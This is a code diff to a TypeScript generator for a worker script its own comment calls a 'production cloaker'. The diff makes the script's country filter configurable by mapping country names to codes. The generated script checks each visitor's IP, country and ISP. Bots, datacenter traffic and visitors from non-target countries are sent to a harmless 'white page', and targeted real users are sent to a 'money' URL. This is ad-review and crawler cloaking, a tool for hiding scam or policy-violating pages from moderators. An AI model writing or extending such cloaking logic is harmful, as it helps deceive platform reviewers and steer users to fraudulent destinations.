@@ -710,6 +710,39 @@ export function generateJciWorkerScript(options: {
   // Use white page URL if provided, otherwise use safe URL as fallback
   const safePageUrl = whitePageUrl || safeUrl;
   
+  // Convert country names to country codes for ip-api.com
+  const countryNameToCode: Record<string, string> = {
+    'Germany': 'DE',
+    'United States': 'US',
+    'United Kingdom': 'GB',
+    'France': 'FR',
+    'Italy': 'IT',
+    'Spain': 'ES',
+    'Netherlands': 'NL',
+    'Belgium': 'BE',
+    'Austria': 'AT',
+    'Switzerland': 'CH',
+    'Canada': 'CA',
+    'Australia': 'AU',
+    'Norway': 'NO',
+    'Sweden': 'SE',
+    'Denmark': 'DK',
+    'Finland': 'FI',
+    'Poland': 'PL',
+    'Czech Republic': 'CZ',
+    'Portugal': 'PT',
+    'Ireland': 'IE',
+    'Luxembourg': 'LU',
+    'New Zealand': 'NZ',
+    'Japan': 'JP',
+    'South Korea': 'KR'
+  };
+  
+  // Convert target countries from names to codes
+  const targetCountryCodes = options.targetCountries
+    .map(country => countryNameToCode[country] || country)
+    .filter(code => code); // Remove any undefined values
+  
   return `// --- MODIE's FINAL PRODUCTION CLOAKER ---
 // This is the main worker script. It combines the advanced proxy engine with the hybrid cloaking logic.
 
@@ -721,6 +754,9 @@ const API_PROVIDER_SECONDARY = 'proxycheck'; // Options: 'IPQS', 'proxycheck'
 // API Keys - Get these from environment variables
 const IPQS_API_KEY = typeof env !== 'undefined' ? env.IPQS_API_KEY : 'YOUR_IPQS_API_KEY_HERE';
 const PROXYCHECK_API_KEY = typeof env !== 'undefined' ? env.PROXYCHECK_API_KEY : 'YOUR_PROXYCHECK_API_KEY_HERE';
+
+// Target Countries - Allowed countries for real traffic (country codes)
+const TARGET_COUNTRIES = ${JSON.stringify(targetCountryCodes)};
 
 // URLs - The final destinations
 const MONEY_URL = '${moneyUrl}';
@@ -785,8 +821,8 @@ async function isVisitorABot(request, env) {
   const ipApiResponse = await fetch(ipApiUrl);
   if (ipApiResponse.ok) {
     const ipApiData = await ipApiResponse.json();
-    if (ipApiData.countryCode !== 'DE' || ['google', 'amazon', 'microsoft'].some(b => ipApiData.isp.toLowerCase().includes(b))) {
-      return true; // Block non-German traffic or known datacenter ISPs
+    if (!TARGET_COUNTRIES.includes(ipApiData.countryCode) || ['google', 'amazon', 'microsoft'].some(b => ipApiData.isp.toLowerCase().includes(b))) {
+      return true; // Block traffic from non-target countries or known datacenter ISPs
     }
   }
 
